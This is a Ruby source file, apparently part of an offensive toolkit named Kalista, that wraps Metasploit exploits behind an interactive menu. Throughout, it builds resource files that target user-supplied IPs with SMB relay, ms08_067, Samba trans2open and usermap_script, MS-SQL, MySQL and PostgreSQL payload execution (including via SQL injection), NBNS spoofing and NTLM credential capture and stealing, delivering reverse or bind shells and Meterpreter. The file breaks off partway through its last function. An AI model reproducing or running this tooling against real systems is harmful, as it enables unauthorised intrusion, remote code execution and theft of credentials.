# This is our Exploit Class
# This should house anything related to Exploits & their operations 
# Specific Exploits or Wrappers and tools to aid in Exploit adjustments
# If you add, just update the usage and e_shell function to make available

class Exploit
	def show_exploits_usage
		puts "List of available commands and general description".light_yellow + ": ".white
		puts "\tcls".light_yellow + "          => ".white + "Clear Screen".light_yellow
		puts "\thelp ".light_yellow + "        => ".white + "Display this Help Menu".light_yellow
		puts "\tback ".light_yellow + "        => ".white + "Return to Main Menu".light_yellow
		puts "\texit ".light_yellow + "        => ".white + "Exit Completely".light_yellow
		print_line("")
		puts "\tsmb_cap ".light_yellow + "     => ".white + "Windows SMB Authentication Capture".light_yellow
		puts "\tnbns_spoof ".light_yellow + "  => ".white + "NetBIOS Name Service Spoofer (nbns_spoofer)".light_yellow
		puts "\thttp_ntlm ".light_yellow + "   => ".white + "Windows HTTP Client Credential Capture (http_ntlm)".light_yellow
		puts "\tsmb_relay ".light_yellow + "   => ".white + "Windows SMB Relay Exploit".light_yellow
		print_line("")
		puts "\twinrm ".light_yellow + "       => ".white + "WinRM Credentialed Payload Execution".light_yellow
		puts "\tnetapi ".light_yellow + "      => ".white + "Exploit Windows ms08_067 netapi".light_yellow
		puts "\ttrans2open ".light_yellow + "  => ".white + "Exploit Samba trans2open (*nix: Samba versions 2.2.0 to 2.2.8)".light_yellow
		puts "\tusermap ".light_yellow + "     => ".white + "Exploit Samba 'username map script' (*nix: Samba versions 3.0.20 through 3.0.25rc3)".light_yellow
		print_line("")
		puts "\tmssql_rce ".light_yellow + "   => ".white + "MS-SQL Server Payload Execution (Credentials)".light_yellow
		puts "\tmssqli_rce ".light_yellow + "  => ".white + "MS-SQL Server Payload Execution (via SQLi)".light_yellow
		puts "\tmssql_ntlm ".light_yellow + "  => ".white + "MS-SQL Server NTLM Stealer".light_yellow
		puts "\tmssqli_ntlm ".light_yellow + " => ".white + "MS-SQL Server NTLM Stealer via SQLi".light_yellow
		puts "\tmysql_udf ".light_yellow + "   => ".white + "Windows Oracle MySQL UDF Payload Execution".light_yellow
		puts "\tmysql_mof ".light_yellow + "   => ".white + "Windows Oracle MySQL MOF Payload Execution".light_yellow
		puts "\tpgsql_win ".light_yellow + "   => ".white + "Windows PostgreSQL Payload Execution (Credentials)".light_yellow
		puts "\tpgsql_nix ".light_yellow + "   => ".white + "Linux PostgreSQL Payload Execution (Credentials)".light_yellow
		print_line("")
	end

	#Exploits Main Menu
	def e_shell
		prompt = "(Exploits)> "
		while line = Readline.readline("#{prompt}", true)
			cmd = line.chomp
			case cmd
				when /^clear|^cls|^banner/i
					cls
					banner
					e_shell
				when /^help|^h$|^ls$/i
					show_exploits_usage
					e_shell
				when /^exit|^quit/i
					print_line("")
					print_error("OK, exiting Kalista....")
					print_line("")
					exit 69;
				when /^back|^main/i
					print_line("")
					print_error("OK, back to the Main Menu....")
					print_line("")
					$framework.core_shell
				when /^smb_cap/i
					print_line("")
					smb_capture
					e_shell
				when /^http|^ntlm/i
					print_line("")
					http_ntlm_capture
					e_shell
				when /^nbns|^netbios/i
					print_line("")
					nbns_spoof
					e_shell
				when /^smb_relay|^relay/i
					print_line("")
					smb_relay
					e_shell
				when /^netapi|^ms08/i
					print_line("")
					netapi_exploit
					e_shell
				when /^trans2open|^trans$/i
					print_line("")
					trans2open_exploit
					e_shell
				when /^usermap/i
					print_line("")
					usermap_exploit
					e_shell
				when /^mssql_rce/i
					print_line("")
					mssql_rce
					e_shell
				when /^mssqli_rce/i
					print_line("")
					mssqli_rce
					e_shell
				when /^mssql_ntlm/i
					print_line("")
					mssql_ntlm
					e_shell
				when /^mssqli_ntlm/i
					print_line("")
					mssqli_ntlm
					e_shell
				when /^mysql_udf/i
					print_line("")
					mysql_udf
					e_shell
				when /^mysql_mof/i
					print_line("")
					mysql_mof
					e_shell
				when /^pgsql_win/i
					print_line("")
					pgsql_win
					e_shell
				when /^pgsql_nix/i
					print_line("")
					pgsql_nix
					e_shell
				when /^winrm/i
					print_line("")
					winrm_cmd_exec
					e_shell
				else
					cls
					print_line("")
					print_error("Oops, Didn't quite understand that one")
					print_error("Please Choose a Valid Option From Menu Below Next Time.....")
					print_line("")
					show_exploits_usage
					e_shell
				end
		end
	end

	# SMB Authentication Capture Server
	# Very good for using when you have windows boxes connecting to you over SMB from other setups
	# Usses static challenge so any password hashes received can be fairly easily cracked offline
	def smb_capture
		print_status("Logging to #{$results}/cain_smb.txt & #{$results}/john_smb.txt...")
		print_status("Launching SMB Authentication Capture Server in a new x-window.....")
		rcfile="#{Dir.pwd}/msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts 'use auxiliary/server/capture/smb'
		f.puts "set CAINPWFILE #{$results}/cain_smb.txt"
		f.puts "set JOHNPWFILE #{$results}/john_smb.txt"
		f.puts 'exploit -j'
		f.close
		smb_auth="xterm -title 'MSF SMB Authentication Capture' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(smb_auth)
		print_line("")
	end

	# HTTP NTLM Authentication Capture Server
	# Very good for using when you have windows boxes connecting to you over HTTP from other setups
	# Usses static challenge so any password hashes received can be fairly easily cracked offline
	def http_ntlm_capture
		print_status("HTTP Client MS Credential Catcher (http_ntlm)")
		print_caution("Server Port to Use: ")
		zPORT=gets.chomp

		print_caution("URI Path to Use: ")
		zPATH=gets.chomp

		print_status("Launching HTTP NTLM Credential Capture Server in a new x-window.....")
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts 'use auxiliary/server/capture/http_ntlm'
		f.puts "set SRVPORT #{zPORT}"
		f.puts "set URIPATH #{zPATH}"
		f.puts "set CAINPWFILE #{Dir.pwd}/cain_http_ntlm.txt"
		f.puts "set JOHNPWFILE #{Dir.pwd}/john_http_ntlm.txt"
		f.puts 'exploit -j'
		f.close

		http_ntlm="xterm -title 'MSF HTTP NTLM Capture' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(http_ntlm)
		print_line("")
	end

	# MSF NetBIOS Name Service Spoofer (nbns_spoofer)
	# Handy for when netbios requests are being received, allows one to spoof the result to direct traffic to our box
	# Handy when paird with the SMB_RELAY Exploit or SMB & netNTLM Capture Servers as allows you to gain credentials or exploit targeted boxes
	# best with capture & offline cracking imo.....
	def nbns_spoof
		print_status("NetBIOS Name Service Spoofer")
		print_caution("Select the Interface to use for listening: ")
		count=1
		while(true)
			face = commandz('/sbin/ifconfig | cut -d\' \' -f1 | sed \'/^$/d\'').each do |x| 
				if count.to_i < 10
					print_caution("#{count})  #{x.chomp}")
				else
					print_caution("#{count}) #{x.chomp}")
				end
				count = count.to_i + 1
			end
			answer=gets.chomp
			if answer > 0 and answer <= face.size
				interface=face[answer.to_i-1] #have to account for a zero index ;)
				break
			end
		end
		print_caution("IP address to poison in responses: ")
		zIP=gets.chomp

		print_status("Launching MSF NetBIOS Name Service Spoofer in a new x-window.....")
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts 'use use auxiliary/spoof/nbns/nbns_response'
		f.puts "set INTERFACE #{interface}"
		f.puts "set SPOOFIP #{zIP}"
		f.puts 'exploit -j'
		f.close

		nbspoof="xterm -title 'MSF NBNS Spoofer' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(nbspoof)
		print_line("")
	end

	# MSF Windows SMB Relay Exploit
	# If you have ability to manipulate or force victims to visit shares on our box this can be very very useful
	# It is wise to also setup the credentials capture tools in parallel so you still get credentials if exploit fails for offline cracking.....
	def smb_relay
		print_status("Microsoft Windows SMB Relay Code Execution Exploit")
		print_caution("Select Targeting Method: ")
		print_caution("1) Single Target IP")
		print_caution("2) Anyone who knocks on our door")
		answer=gets.chomp
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts 'use exploit/windows/smb/smb_relay'
		if answer == '1'
			print_caution("Provide Target IP: ")
			zIP=gets.chomp
			f.puts 'set SMBHOST #{zIP}'
		end
		while(true)
			print_caution("Select Share Name to Connect to: ")
			print_caution("1) ADMIN$ (Remote Admin Disk => Default)")
			print_caution("2) C$ (Default Winblows Share)")
			print_caution("3) IPC$ (Winblows Remote IPC)")
			print_caution("4) Custom User Provided Share (z$, plus$, forums$)")
			answer=gets.chomp
			case answer
				when '1'
					break
				when '2'
					f.puts 'set SHARE C$'
					break
				when '3'
					f.puts 'set SHARE IPC$'
					break
				when '4'
					print_caution("Provide Custom Share Name: ")
					custom_share=gets.chomp
					f.puts "set SHARE #{custom_share}"
					break
			end
		end
		payload = payload_selector(2) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
		if payload =~ /bind/
			print_caution("Please provide PORT for Bind Shell: ")
		else
			print_caution("Please provide PORT to listen on: ")
		end
		zport=gets.chomp

		print_status("Launching Windows SMB Relay Exploit Server in a new x-window.....")
		f.puts "set PAYLOAD #{payload}"
		f.puts "set LHOST 0.0.0.0"
		f.puts "set LPORT #{zport}"
		f.puts "set ExitOnSession false"
		if payload =~ /meterpreter/
			f.puts "set AutoRunScript migrate -f"
		end
		f.puts "exploit -j -z"
		f.close

		relay="xterm -title 'MSF SMB Relay' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(relay)
		print_line("")
	end

	# MSF Exploit for the netapi ms08_067 Windows vulnerability
	def netapi_exploit
		print_status("Exploit ms08_067 (netapi) Winblows Vulnerability")
		print_caution("Provide Target IP: ")
		zIP=gets.chomp

		payload = payload_selector(2) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
		if payload =~ /bind/
			print_caution("Please provide PORT for Bind Shell: ")
		else
			print_caution("Please provide PORT to listen on: ")
		end
		zport=gets.chomp

		print_status("Launching Exploit for ms08_067 (netapi) against #{zIP} in a new x-window.....")
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use exploit/windows/smb/ms08_067_netapi"
		f.puts "set RHOST #{zIP}"
		f.puts "set PAYLOAD #{payload}"
		f.puts "set LHOST 0.0.0.0"
		f.puts "set LPORT #{zport}"
		f.puts "set ExitOnSession false"
		if payload =~ /meterpreter/
			f.puts "set AutoRunScript migrate -f"
		end
		f.puts "exploit -j -z"
		f.close

		ms08="xterm -title 'MSF ms08_067 Exploit' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(ms08)
		print_line("")
	end

	# MSF Exploit for the Samba trans2open vulnerability
	# *nix: Samba versions 2.2.0 to 2.2.8
	def trans2open_exploit
		print_status("Exploit Samba trans2open Overflow (*nix) Vulnerability")
		while(true)
			print_caution("Select target: ")
			print_caution("1) *BSD x86")
			print_caution("2) Linux x86")
			print_caution("3) Mac OS X PPC")
			print_caution("4) Solaris SPARC")
			answer=gets.chomp
			case answer
				when '1'
					sploit='exploit/freebsd/samba/trans2open'
				when '2'
					sploit='exploit/linux/samba/trans2open'
				when '3'
					sploit='exploit/osx/samba/trans2open'
				when '4'
					sploit='exploit/solaris/samba/trans2open'
			end
		end
		print_caution("Provide Target IP: ")
		zIP=gets.chomp

		payload = payload_selector(2) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
		if payload =~ /bind/
			print_caution("Please provide PORT for Bind Shell: ")
		else
			print_caution("Please provide PORT to listen on: ")
		end
		zport=gets.chomp

		print_status("Launching Exploit for Samba trans2open Overflow against #{zIP} in a new x-window.....")
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use #{sploit}"
		f.puts "set RHOST #{zIP}"
		f.puts "set PAYLOAD #{payload}"
		f.puts "set LHOST 0.0.0.0"
		f.puts "set LPORT #{zport}"
		f.puts "set ExitOnSession false"
		if payload =~ /meterpreter/
			f.puts "set AutoRunScript migrate -f"
		end
		f.puts "exploit -j -z"
		f.close
		trans="xterm -title 'MSF trans2open Exploit' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(trans)
		print_line("")
	end

	# MSF Exploit for the Samba 'username map script' vulnerability
	# Affects *nix: Samba versions 3.0.20 through 3.0.25rc3
	def usermap_exploit
		print_status("Exploit Samba 'username map script' Command Execution (3.0.20 through 3.0.25rc3)")
		print_caution("Provide Target IP: ")
		zIP=gets.chomp

		payloadz=[ '1' => 'cmd/unix/bind_netcat', '2' => 'cmd/unix/bind_netcat_gaping', '3' => 'cmd/unix/bind_perl', '4' => 'cmd/unix/bind_ruby', '5' => 'cmd/unix/reverse', '6' => 'cmd/unix/reverse_netcat', '7' => 'cmd/unix/reverse_netcat_gaping', '8' => 'cmd/unix/reverse_perl', '9' => 'cmd/unix/reverse_python', '10' => 'cmd/unix/reverse_ruby' ]
		while(true)
			print_caution("Select Payload to use: ")
			payloadz.each { |key,value| puts (key.to_i < 10) ? "#{key})  #{value}" : "#{key}) #{value}" }
			sizer=payloadz.size
			answer=gets.chomp
			if answer.to_i == 0 or answer.to_i > sizer.to_i
				print_error("")
				print_error("Please Enter a Valid Option!")
				print_error("")
			else
				payload = payloadz[answer]
				break
			end
		end
		if payload =~ /bind/
			print_caution("Please provide PORT for Bind Shell: ")
		else
			print_caution("Please provide PORT to listen on: ")
		end
		zport=gets.chomp

		print_status("Launching Exploit for Samba 'username map script' Command Execution Vulnerability against #{zIP} in a new x-window.....")
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use exploit/multi/samba/usermap_script"
		f.puts "set RHOST #{zIP}"
		f.puts "set PAYLOAD #{payload}"
		f.puts "set LHOST 0.0.0.0"
		f.puts "set LPORT #{zport}"
		f.puts "set ExitOnSession false"
		f.puts "exploit -j -z"
		f.close

		umap="xterm -title 'MSF Samba 'username map script' Command Execution Exploit #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(umap)
		print_line("")
	end


	# MSF MS-SQL Server Payload Execution via xp_cmdshell and valid Credentials
	# Highly effective exploit if you have valid credentials with privs (i.e. sa user)
	def mssql_rce
		print_status("MS-SQL Server xp_cmdshell Credentialed Payload Execution")
		print_caution("Provide Target IP: ")
		zIP=gets.chomp

		print_caution("Please provide MS-SQL Username: ")
		sqlUser=gets.chomp

		print_caution("Please provide MS-SQL User Password: ")
		sqlPass=gets.chomp

		print_caution("Use Standard MS-SQL Port of 1433 (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'N' or answer.upcase == 'NO'
			print_caution("Provide MS-SQL Port: ")
			zPORT=gets.chomp
		else
			zPORT='1433'
		end
		while(true)
			print_caution("Select Payload Delivery Method: ")
			print_caution("1) debug.com OLD School Script Conversion Method (x86 Only)")
			print_caution("2) wcsript.exe CMD Staged Delivery Method")
			print_caution("3) PowerShell Staged Delivery")
			answer=gets.chomp
			if answer == '1'
				zMETHOD='old'
			elsif answer == '2'
				zMETHOD='cmd'
			elsif answer == '3'
				zMETHOD='ps'
			end
		end
		#Select Payload to use
		payload = payload_selector(2) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
		if payload =~ /bind/
			print_caution("Please provide PORT for Bind Shell: ")
		else
			print_caution("Please provide PORT to listen on: ")
		end
		zport=gets.chomp

		print_status("Launching MS-SQL Server xp_cmdshell Credentialed Payload Execution against #{zIP}:#{zPORT} in a new x-window.....")
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use exploit/windows/mssql/mssql_payload"
		f.puts "set RHOST #{zIP}"
		f.puts "set RPORT #{zPORT}"
		f.puts "set USERNAME #{sqlUser}"
		f.puts "set PASSWORD #{sqlPass}"
		f.puts "set PAYLOAD #{payload}"
		f.puts "set LHOST 0.0.0.0"
		f.puts "set LPORT #{zport}"
		if payload =~ /meterpreter/
			f.puts "set AutoRunScript migrate -f"
		end
		f.puts "set ExitOnSession false"
		f.puts "exploit -j -z"
		f.close

		sql_sploit="xterm -title 'MS-SQL xp_cmdshell Payload Execution' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(sql_sploit)
		print_line("")
	end

	# MSF MS-SQL Server Payload Execution via xp_cmdshell and accomplished through SQL Injection
	# Highly effective exploit if you are running as privileged user and can identify the SQL Injection entry point
	def mssqli_rce
		print_status("Microsoft SQL Server xp_cmdshell Payload Execution via SQLi")
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use exploit/windows/mssql/mssql_payload_sqli"
		while(true)
			print_caution("Select Request Type: ")
			print_caution("1) GET")
			print_caution("2) POST")
			answer=gets.chomp

			print_caution("Provide vuln URI with '[SQLi]' marker in place where needed (can be in DATA section for POST): ")
			print_caution("NOTE: include any prefix or siffix required to complete injection!")
			print_caution("\t=> http://example.com/index.asp?vuln=1';[SQLi];-- -&notvuln=form")
			vuln_link=URI(URI.encode(gets.chomp))
			if answer == '1'
				break
			elsif answer == '2'
				print_caution("Please provide any POST Data needed for request: ")
				zDATA=gets.chomp
				f.puts "set DATA #{zDATA}"
				f.puts 'set METHOD POST'
				break
			end
		end
		f.puts "set GET_PATH #{vuln_link.request_uri}"
		f.puts "set RHOST #{vuln_link.host}"
		f.puts "set RPORT #{vuln_link.port}"
		f.puts "set VHOST #{vuln_link.host}"
		while(true)
			print_caution("Select Payload Delivery Method: ")
			print_caution("1) debug.com OLD School Script Conversion Method (x86 Only)")
			print_caution("2) wcsript.exe CMD Staged Delivery Method")
			print_caution("3) PowerShell Staged Delivery")
			answer=gets.chomp
			if answer == '1'
				f.puts "set DELIVERY old"
				break
			elsif answer == '2'
				f.puts "set DELIVERY cmd"
				break
			elsif answer == '3'
				f.puts "set DELIVERY ps"
				break
			end
		end
		payload = payload_selector(2) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
		if payload =~ /bind/
			print_caution("Please provide PORT for Bind Shell: ")
		else
			print_caution("Please provide PORT to listen on: ")
		end
		zport=gets.chomp

		print_status("Launching Microsoft SQL Server xp_cmdshell Payload Execution via SQL Injection against #{zIP} in a new x-window.....")
		f.puts "set PAYLOAD #{payload}"
		f.puts "set LHOST 0.0.0.0"
		f.puts "set LPORT #{zport}"
		if payload =~ /meterpreter/
			f.puts "set AutoRunScript migrate -f"
		end
		f.puts "set ExitOnSession false"
		f.puts "exploit -j -z"
		f.close

		sqli_sploit="xterm -title 'MS-SQLi xp_cmdshell Payload Execution' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(sqli_sploit)
		print_line("")
	end

	# MSF Exploit which uses xp_dirtree to make a remote share request. Uses valid credentials to login to make requests.
	# This results in the MS-SQL Server connecting to our box so HTTP NTLM Credentials can be captured for offline cracking
	def mssql_ntlm
		print_status("Microsoft SQL Server Credentialed NTLM Stealer")
		print_caution("Provide target IP: ")
		zIP=gets.chomp

		while(true)
			print_caution("Use default MS-SQL Port of 1433 (Y/N)?")
			answer=gets.chomp
			if answer.upcase == 'N' or answer.upcase == 'NO'
				print_caution("Provide Port to use then: ")
				zPORT=gets.chomp
				break
			elsif answer.upcase == 'Y' or answer.upcase == 'YES'
				zPORT='1433'
				break
			end
		end
		print_caution("MS-SQL Username: ")
		zUSER=gets.chomp

		print_caution("MS-SQL Password: ")
		zPASS=gets.chomp
		while(true)
			print_caution("Is SMB Proxy Server running locally (Y/N)?")
			answer=gets.chomp
			if answer.upcase == 'N' or answer.upcase == 'NO'
				print_caution("Provide IP of SMB Proxy Server: ")
				smbProxy=gets.chomp
			elsif answer.upcase == 'Y' or answer.upcase == 'YES'
				smbProxy='0.0.0.0'
			end
		end
		print_status("Launching Microsoft SQL Server NTLM Stealer in a new x-window.....")
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts 'use auxiliary/admin/mssql/mssql_ntlm_stealer'
		f.puts "set RHOSTS #{zIP}"
		f.puts "set RPORT #{zPORT}"
		f.puts "set SMBPROXY #{smbProxy}"
		f.puts "set USERNAME #{zUSER}"
		f.puts "set PASSWORD #{zPASS}"
		f.puts 'exploit -j'
		f.close

		ntlm_stealer="xterm -title 'MS-SQL NTLM Stealer' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(ntlm_stealer)
		print_line("")
	end

	# MSF Exploit which uses xp_dirtree to make a remote share request. Uses SQL Injection entry point identified by user to then abuse the stacked queries support to make the remote share request
	# This results in the MS-SQL Server connecting to our box so HTTP NTLM Credentials can be captured for offline cracking
	def mssqli_ntlm
		print_status("Microsoft SQL Server NTLM Stealer via SQLi")
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts 'use auxiliary/admin/mssql/mssql_ntlm_stealer'
		while(true)
			print_caution("Select Request Type: ")
			print_caution("1) GET")
			print_caution("2) POST")
			answer=gets.chomp
			print_caution("Provide vuln URI with '[SQLi]' marker in place where needed (can be in DATA section for POST): ")
			print_caution("NOTE: include any prefix or suffix required to complete injection!")
			print_caution("\t=> http://example.com/index.asp?vuln=1';[SQLi];-- -&notvuln=form")
			vuln_link=URI(URI.encode(gets.chomp))
			if answer == '1'
				break
			elsif answer == '2'
				print_caution("Please provide any POST Data needed for request: ")
				zDATA=gets.chomp
				f.puts "set DATA #{zDATA}"
				f.puts 'set METHOD POST'
				break
			end
		end			
		f.puts "set GET_PATH #{vuln_link.request_uri}"
		f.puts "set RHOST #{vuln_link.host}"
		f.puts "set RPORT #{vuln_link.port}"
		f.puts "set VHOST #{vuln_link.host}"
		while(true)
			print_caution("Is SMB Proxy Server running locally (Y/N)?")
			answer=gets.chomp
			if answer.upcase == 'N' or answer.upcase == 'NO'
				print_caution("Provide IP of SMB Proxy Server: ")
				smbProxy=gets.chomp
			elsif answer.upcase == 'Y' or answer.upcase == 'YES'
				smbProxy='0.0.0.0'
			end
		end
		f.puts "set SMBPROXY #{smbProxy}"
		f.puts 'exploit -j'
		f.close
		print_status("Launching MS-SQL Server NTLM Stealer via SQL Injetion in a new x-window.....")
		ntlm_stealer="xterm -title 'MS-SQL NTLM Stealer via SQLi' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(ntlm_stealer)
		print_line("")
	end

	# MSF Windows Oracle MySQL UDF Payload Execution
	# Abuses writable temp dir and admin privs to write custom User Defined Functions for MySQL which can allow OS Execution if successful
	# Needs credentials for valid user
	def mysql_udf
		print_status("Oracle MySQL for Microsoft Winblows UDF Payload Execution")
		print_caution("Provide Target IP: ")
		zIP=gets.chomp

		print_caution("Please provide MySQL Username: ")
		sqlUser=gets.chomp

		print_caution("Please provide MySQL User Password: ")
		sqlPass=gets.chomp

		print_caution("Use Standard MySQL Port of 3306 (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'N' or answer.upcase == 'NO'
			print_caution("Provide MySQL Port: ")
			zPORT=gets.chomp
		else
			zPORT='3306'
		end
		print_status("Please remember to choose a Winblows Payload.....")
		payload = payload_selector(2) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
		if payload =~ /bind/
			print_caution("Please provide PORT for Bind Shell: ")
		else
			print_caution("Please provide PORT to listen on: ")
		end
		zport=gets.chomp

		print_status("Launching MySQL for Winblows UDF Payload Execution against #{zIP}:#{zPORT} in a new x-window.....")
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use exploit/windows/mysql/mysql_payload"
		f.puts "set RHOST #{zIP}"
		f.puts "set RPORT #{zPORT}"
		f.puts "set USERNAME #{sqlUser}"
		f.puts "set PASSWORD #{sqlPass}"

		f.puts "set PAYLOAD #{payload}"
		f.puts "set LHOST 0.0.0.0"
		f.puts "set LPORT #{zport}"
		f.puts "set ExitOnSession false"
		if payload =~ /meterpreter/
			f.puts "set AutoRunScript migrate -f"
		end
		f.puts "exploit -j -z"
		f.close

		mysql_sploit="xterm -title 'MySQL UDF Payload Execution' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(mysql_sploit)
		print_line("")
	end

	# MSF Windows Oracle MySQL MOF Payload Execution Exploit
	# Uses valid user credentials to login and create MOF file which is then triggered to achieve RCE
	# Needs credentials for valid user
	def mysql_mof
		print_status("Oracle MySQL for Microsoft Winblows MOF Payload Execution")
		puts "Provide Target IP: "
		zIP=gets.chomp

		puts "Please provide MySQL Username: "
		sqlUser=gets.chomp

		puts "Please provide MySQL User Password: "
		sqlPass=gets.chomp

		puts "Use Standard MySQL Port of 3306 (Y/N)?"
		answer=gets.chomp
		if answer.upcase == 'N' or answer.upcase == 'NO'
			puts "Provide MySQL Port: "
			zPORT=gets.chomp
		else
			zPORT='3306'
		end
		print_status("Please remember to choose a Winblows Payload.....")
		payload = payload_selector(2) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
		if payload =~ /bind/
			puts "Please provide PORT for Bind Shell: "
		else
			puts "Please provide PORT to listen on: "
		end
		zport=gets.chomp

		print_status("Launching MySQL MOF Payload Execution against #{zIP}:#{zPORT} in a new x-window.....")
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use exploit/windows/mysql/mysql_mof"
		f.puts "set RHOST #{zIP}"
		f.puts "set RPORT #{zPORT}"
		f.puts "set USERNAME #{sqlUser}"
		f.puts "set PASSWORD #{sqlPass}"
		f.puts "set PAYLOAD #{payload}"
		f.puts "set LHOST 0.0.0.0"
		f.puts "set LPORT #{zport}"
		f.puts "set ExitOnSession false"
		if payload =~ /meterpreter/
			f.puts "set AutoRunScript migrate -f"
		end
		f.puts "exploit -j -z"
		f.close

		mofsql_sploit="xterm -title 'MySQL MOF Payload Execution' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(mofsql_sploit)
		print_line("")
	end

	# MSF Windows PostgreSQL Payload Execution via valid credentials
	# Needs credentials for valid user
	def pgsql_win
		print_status("PostgreSQL for Windows Credentialed Payload Execution")
		print_caution("Provide Target IP: ")
		zIP=gets.chomp

		print_caution("Please provide PostgreSQL Username: ")
		sqlUser=gets.chomp

		print_caution("Please provide PostgreSQL User Password: ")
		sqlPass=gets.chomp

		print_caution("Use Standard PostgreSQL Port of 5432 (Y/N)?")
		answer=gets.chomp
		if answer.upcase == 'N' or answer.upcase == 'NO'
			print_caution("Provide PostgreSQL Port: ")
			zPORT=gets.chomp
		else
			zPORT='5432'
		end
		while(true)
			print_caution("Select Target Type: ")
			print_caution("1) Windows x86")
			print_caution("2) Windows x86_64")
			answer=gets.chomp
			if answer == '1'
				zTARGET='0'
			elsif answer == '2'
				zTARGET='1'
			end
		end
		print_caution("Please remember to choose a Windows Payload.....")
		payload = payload_selector(2) # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder #
		if payload =~ /bind/
			print_caution("Please provide PORT for Bind Shell: ")
		else
			print_caution("Please provide PORT to listen on: ")
		end
		zport=gets.chomp

		print_status("Launching PostgreSQL for Windows Credentialed Payload Execution against #{zIP}:#[zPORT} in a new x-window.....")
		rcfile="#{$temp}msfassist.rc"
		f=File.open(rcfile, 'w')
		f.puts "db_connect #{MSFDBCREDS}"
		f.puts "use exploit/windows/postgres/postgres_payload"
		f.puts "set RHOST #{zIP}"
		f.puts "set RPORT #{zPORT}"
		f.puts "set USERNAME #{sqlUser}"
		f.puts "set PASSWORD #{sqlPass}"
		f.puts "set PAYLOAD #{payload}"
		f.puts "set LHOST 0.0.0.0"
		f.puts "set LPORT #{zport}"
		f.puts "set ExitOnSession false"
		if payload =~ /meterpreter/
			f.puts "set AutoRunScript migrate -f"
		end
		f.puts "exploit -j -z"
		f.close

		pgsql_sploit="xterm -title 'PostgreSQL Windows Credentialed Payload Execution' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
		fireNforget(pgsql_sploit)
		print_line("")
	end

	# MSF Linux PostgreSQL Payload Execution via valid credentials
	# Needs credentials for valid user
	def pgsql_nix
		print_status("PostgreSQL Linux Credentialed Payload Execution")
		print_caution("Provide Target IP: ")
		zIP=gets.chomp

		print_caution("Please provide PostgreSQL Username: ")
		sqlUser=gets.chomp

		print_caution("Please provide PostgreSQL User Password: ")
		sqlPass=gets.chomp

		print_caution("Use Standard PostgreSQL Port of 5432 (Y/N)?")
